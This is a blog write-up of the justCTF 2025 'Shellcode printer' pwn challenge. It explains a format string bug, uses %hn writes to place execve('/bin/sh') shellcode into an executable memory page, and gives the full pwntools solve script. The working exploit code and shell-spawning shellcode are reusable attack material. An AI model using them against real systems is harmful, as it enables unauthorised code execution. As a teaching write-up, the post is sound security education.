---
layout: post
title: "justCTF - Shellcode printer"
date: 2026-02-08
tags: [pwn, format string]
---

For my first real writeup on here, i've decided to document a pretty simple pwn challenge I solved a while ago at [justCTF2025](https://2025.justctf.team/). 

TL;DR: The challenge contains a simple format string vulnerability, which we can abuse to write arbitrary shellcode into a memory page in 2-byte chunks, which the binary then executes.

![shellcode printer]({{ site.baseurl }}/assets/images/shellcode_printer_description.jpg)

## Intro

The challenge provides provides us with just the binary and a Dockerfile. First, let's do some basic reconnaissance using `file` and `checksec`:

```bash
(pyvenv) urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e454d2e08d672dd2e65a794a8fa7bb2bbb673aed, for GNU/Linux 3.2.0, stripped
```

We can see this is a dynamically linked 64-bit binary. It's also stripped, which will make reverse engineering and debugging a little harder, especially since we weren't given the source code.

```bash
(pyvenv) urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ checksec vuln
[*] '/home/urichh/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

Checksec doesn't reveal much of use. Pretty much all standard protections (stack canary, non-execute, PIE etc.) are enabled.

Now let's try to reverse engineer the binary using ghidra. Running the automatic analysis, we get some decompiled C-style pseudocode. Note that i've taken the liberty of renaming some of the variables and functions for ease of understanding, as the binary was stripped of all symbols and debugging information.

```c
undefined8 main(void)
{
  int page_size;
  FILE *__stream;
  char *pcVar1;
  size_t sVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  code *mem_page;
  char input_buffer [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  page_size = getpagesize();
  mem_page = mmap((void *)0x0,(long)page_size,7,0x22,-1,0);
  if (mem_page == (code *)0xffffffffffffffff) {
    perror("mmap");
  }
  else {
    __stream = fopen("/dev/null","w");
    if (__stream == (FILE *)0x0) {
      perror("fopen");
    }
    else {
      *mem_page = (code)0xc3;
      mem_page = mem_page + -2;
      while( true ) {
        input_buffer[0] = '\0';
        input_buffer[1] = '\0';
        input_buffer[2] = '\0';
        input_buffer[3] = '\0';
        input_buffer[4] = '\0';
        input_buffer[5] = '\0';
        input_buffer[6] = '\0';
        input_buffer[7] = '\0';
        input_buffer[8] = '\0';
        input_buffer[9] = '\0';
        input_buffer[10] = '\0';
        input_buffer[0xb] = '\0';
        input_buffer[0xc] = '\0';
        input_buffer[0xd] = '\0';
        input_buffer[0xe] = '\0';
        input_buffer[0xf] = '\0';
        printf("Enter a format string: ");
        pcVar1 = fgets(input_buffer,0x10,stdin);
        if (pcVar1 == (char *)0x0) break;
        sVar2 = strcspn(input_buffer,"\n");
        input_buffer[sVar2] = '\0';
        if (input_buffer[0] == '\0') {
          uVar3 = (*mem_page)();
          goto LAB_00101489;
        }
        mem_page = mem_page + 2;
        fprintf(__stream,input_buffer);
      }
      perror("fgets");
    }
    fclose(__stream);
  }
  munmap(mem_page,(long)page_size);
  uVar3 = 1;
LAB_00101489:
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

One line immediatly stands out - `fprintf(__stream,input_buffer);`, as it doesn't contain a format specifier. This leads to a format string vulnerability, as we can input things like `%x`, `%p`, `%n` etc. and fprintf will evaluate them.

At first I ran the binary and tried to leak some values from the stack using `%x`, `$2%x`, `$2%x` and such, but it produced no output what so ever. After a quick return to the decompiled pseudocode, I quickly noticed the problem: `__stream = fopen("/dev/null","w");`. The stream was writing output into `/dev/null` instead of my terminal, so I decided to change that :)

## Patching the binary to capture output

As stated above, I didn't like the fact that I didn't see any output from the binary, so I decided to patch it. This is in no way needed to solve the challenge, but it just makes it easier. Since the string `/dev/tty` (which we want as to print to console) is shorter then `/dev/null`, we can simple carve the bytes and add an extra null byte at the end, so as to not change the offsets and pointers, which would have been a huge pain, and usually isn't worth it:

```bash
sed -i 's|/dev/null|/dev/tty\x00|g' vuln_patched
```

 - sed - stream editor for text transformation
 - -i =-edit in-place (modify the file directly)
 - s\|old\|new\|g - substitute pattern (g = global, all occurrences)
 - \x00 - null byte to match original length

Running the patched binary now actually produces output:

```bash
(pyvenv) urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %x
Enter a format string: 
445c35e0
```

## Execution flow

### Memory init
After this brief detour, let's return back to actual execution flow of the binary.

The `main` function first sets up variables and a stack canary (`canary = *(long *)(in_FS_OFFSET + 0x28);`), which is nothing out of the ordinary. Where it gets interesting is the `mmap` command. Let's break it down:

```c
page_size = getpagesize();
mmaped_memory = mmap((void *)0x0, (long)page_size, 7, 0x22, -1, 0);
```

 - 0x0: map at address 0 (probbably ignored due to ASLR?)
 - page_size: Size of allocation
 - 7: PROT_READ (1) \| PROT_WRITE (2) \| PROT_EXEC (4) = Read+Write+Execute (RWX!)
 - 0x22: MAP_PRIVATE (2) \| MAP_ANONYMOUS (0x20) (not important - I think)
 - ...

What's important here, is that this gives us an EXECUTABLE memory page. This will come into play later.

### Main loop

before the main loop, the binary seeds the memory page with a single `ret` (return) - [0xc3](https://shell-storm.org/x86doc/), and moves the start of the page back by 2 bytes. This will get overwritten with out input later.

Then we enter the main loop, which:
 - clars (zeroes) the input buffer - `local_28[n] = '\0';`
 - reads up to 0x10 (15 + null byte) characters of input and stores into `local_28`
 - checks for EOF
 - removes newline (\n)
 - increments function pointer by 2

There's also a condition:

```c
if (local_28[0] == '\0') {
    uVar3 = (*mmaped_memory)();
    goto LAB_00101489;
}
```

If the condition is met (input is empty line), it **casts mmaped_memory to a function pointer and calls it - (*mmaped_memory)()**, and since that memory page is marked as executable, it directly executes any shellcode present in the page. 

### Cleanup

In the end, the binary just cleans up some variables and compares stack canary values to the beginning of the function. Nothing out of the ordinary.

## Exploitation

Our goal is to write some shellcode, which will spawn a shell (/bin/sh), into the RWX memory page (which is then executed) using the format string vulnerability. To achieve this, we can use the `%n` format specifier. `%n` simply writes the number of bytes printed so far to the address pointed to by an argument (we'll get to that later). We can use this in addition to a `%c` specifier, which prints any desired number of characters. When we combine them, something like `%195c%10$n` will write the number 195 (0xc3 in hex - ret) to the address held as the 10th argument (10th value on the stack at that time).

We can also see that even though we can supply 16 bytes of input, the function pointer only moves forward by two. This means that even though we *can* write our shellcode in 16 byte chunks, it would be finnicky to align the function pointer. Instead, I thought it would be best to just split the payload into 2 byte chunks. Since `%n` will write 4 bytes, we instead need to use `%hn` (called a short/half int), to get our desired 2 byte chunks.

So taking this into account, here are the steps we need to take:
 - find the offset on the stack to the pointer to our RWX memory page
 - write some assembly that spawns a shell (shellcode)
 - split it into 2 byte chunks
 - send the payload in chunks

### Finding correct offset

We could go about finding the correct offset in a debugger, but imo it's easier to just brute force this, since the offset is usally fairly small. If we just test out some offsets, this is what we get:

```bash
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %1$p
Enter a format string: 
0x7ffd932e3a30
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %2$p
Enter a format string: 
0x4
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %3$p
Enter a format string: 
(nil)
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %4$p
Enter a format string: 
(nil)
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %5$p
Enter a format string: 
(nil)
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./vuln_patched
Enter a format string: %6$p
Enter a format string: 
0x7fbc20249000
urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ 
```

As we can see, offset 1 and 6 give lib-c-pointer-looking addresses, while the rest are just garbage. Trying offset 1 with a single return instructions (`%195c%1$hn`) gives us a SEGFAULT, so thats probbably not the pointer to our RWX memory page. Offset 6, however, successfuly executes, so we can assume it's the correct pointer. Note that due to [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), the values are randomised for each run.

This also tracks with the standard [x86 calling convention for amd64](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI), which states that the first 6 values on the stack are from registers, so in our case `0x7ffd932e3a30` was probbably RDI, which makes sense.

![x86 calling convention for amd64]({{ site.baseurl }}/assets/images/amd64_calling_convention.png)

### Assembling the shellcode

Now comes the part where we actually write the assembly to spawn a shell. Except we don't, because we just steal one of the many snippets floating around on the internet :D I specifically picked this [23 byte execve(/bin/sh)](https://www.exploit-db.com/exploits/46907), but many others would also do the job just fine.

But if you've been paying attention, you would know that this won't actually work! The issue is that when we're writing the shellcode, the instruction pointer is moving forward by 2 bytes, which means that when the code will be executed, the execution will begin near the end of our shellcode, effectively skipping most of our input. We can work around this by appending a simple `jmp` (jump) to the end, which should jump to the beginning of our shellcode. A simple `jmp -23` will do the trick, as our shellcode is exactly 23 bytes long.

Here is our final shellcode:

```python
#grabbed from https://www.exploit-db.com/exploits/46907 - Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)
shellcode = (
    b'\x48\x31\xf6'              # xor %rsi,%rsi
    b'\x56'                      # push %rsi
    b'\x48\xbf\x2f\x62\x69\x6e\x2f'  # movabs
    b'\x2f\x73\x68'
    b'\x57'                      # push %rdi
    b'\x54'                      # push %rsp
    b'\x5f'                      # pop %rdi
    b'\x6a\x3b'                  # pushq $0x3b
    b'\x58'                      # pop %rax
    b'\x99'                      # cltd
    b'\x0f\x05'                  # syscall
    b'\x00'                      # align
)

shellcode += asm(f"jmp $-23") #jump back to start of shellcode (23 bytes)
```

### Split & send payload

And for the final part, we just need to write a loop which will split our payload into 2 byte chunks, and send them one at a time:

```python
for i in range(0, len(shellcode), 2):
    chunk = u16(shellcode[i:i+2])
    p.recvuntil(b"Enter a format string: ")
    payload = f'%{chunk}c%6$hn'.encode()
    p.sendline(payload)
```
And thats it! This is the entire solve script:

```python
#!/usr/bin/env python3
from pwn import context, process, ELF, asm, u16, remote, args

context.binary = ELF('./vuln', checksec=False)
context.log_level = 'error'

if args.REMOTE:
    p = remote("shellcode-printer.nc.jctf.pro", 1337)
else:
    p = process('./vuln')

#grabbed from https://www.exploit-db.com/exploits/46907 - Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)
shellcode = (
    b'\x48\x31\xf6'              # xor %rsi,%rsi
    b'\x56'                      # push %rsi
    b'\x48\xbf\x2f\x62\x69\x6e\x2f'  # movabs
    b'\x2f\x73\x68'
    b'\x57'                      # push %rdi
    b'\x54'                      # push %rsp
    b'\x5f'                      # pop %rdi
    b'\x6a\x3b'                  # pushq $0x3b
    b'\x58'                      # pop %rax
    b'\x99'                      # cltd
    b'\x0f\x05'                  # syscall
    b'\x00'                      # align
)

shellcode += asm(f"jmp $-23") #jump back to start of shellcode (23 bytes)

for i in range(0, len(shellcode), 2):
    chunk = u16(shellcode[i:i+2])
    p.recvuntil(b"Enter a format string: ")
    payload = f'%{chunk}c%6$hn'.encode()
    p.sendline(payload)

p.recvuntil(b"Enter a format string: ")
p.sendline(b'')
p.interactive()
```

Running the script, we successfully spawn a shell!

```bash
(pyvenv) urichh@toaster:~/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer$ ./sol.py
$ pwd
/home/urichh/Desktop/challs-dropbox/justCTF2025-pwn-shellcode_printer
$ cat flag.txt
just{fake_flag}
```

## Conclusion
In conclusion, this was a pretty simple format string vulnerability challange, and this writeup could have been a lot shorter, I just wanted to take my time with it and go into more detail :)